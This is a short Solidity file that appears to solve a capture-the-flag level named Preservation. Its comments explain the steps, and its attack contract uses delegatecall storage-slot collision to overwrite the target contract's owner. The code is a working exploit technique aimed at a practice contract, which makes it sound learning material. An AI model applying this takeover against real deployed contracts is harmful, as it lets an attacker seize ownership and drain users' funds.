// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution:
// Call setFirstTime(uint256(address of PreservationAttack)) → this overwrites timeZone1Library
// Call setFirstTime(uint256(uint160(yourAddress))) again → delegatecall into your contract → owner gets overwritten
// Direct conversion of address into uint256 is not possible so you can do that offchain like uint256(uint160(address)).
// Browser console might give a big number error. Easiest solution is to write a script in python/js/solidity for interacting
//  with the Preservation contract. Then big number error will be handled internally and you can just pass a uint256 number from your script.

contract PreservationAttack {

    address public dummy1; // slot 0
    address public dummy2; // slot 1
    address public attacker; // slot 2

    function setTime(uint256 _addr) public {
        attacker = address(uint160(_addr)); // write to slot 2
    }
}

